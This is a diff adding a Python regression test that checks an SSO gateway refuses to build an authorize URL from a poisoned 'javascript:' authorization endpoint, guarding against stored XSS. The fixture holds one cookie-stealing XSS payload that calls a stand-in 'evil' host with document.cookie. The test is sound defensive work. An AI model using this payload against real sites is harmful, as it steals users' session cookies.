@@ -242,6 +242,27 @@ async def test_should_reject_discovery_url_targeting_cloud_metadata(strict_gatew
 
 
 @pytest.mark.asyncio
+async def test_should_reject_javascript_authorization_endpoint_in_authorize_url(strict_gateway: OAuth2SsoGateway):
+    # A config poisoned before discovery-time validation existed must never yield a
+    # `javascript:` URL from /auth/sso/url (stored XSS via window.location).
+    payload = "javascript:fetch('//evil?c='+document.cookie)"
+    config = SsoConfiguration(
+        client_id="x",
+        client_secret="encrypted(x)",
+        discovery_url="https://idp.example.com/.well-known/openid-configuration",
+        authorization_endpoint=payload,
+        token_endpoint="https://idp.example.com/token",
+        userinfo_endpoint="https://idp.example.com/userinfo",
+        jwks_uri="https://idp.example.com/jwks",
+        updated_at=datetime.fromtimestamp(0),
+        client_secret_decrypted="x",
+    )
+    with pytest.raises(InvalidSsoSettingsException) as exc_info:
+        await strict_gateway.get_authorize_url(config)
+    assert "document.cookie" not in str(exc_info.value)
+
+
+@pytest.mark.asyncio
 async def test_should_reject_http_discovery_url_in_strict_mode(strict_gateway: OAuth2SsoGateway):
     with pytest.raises(InvalidSsoSettingsException):
         await strict_gateway.validate_discovery(
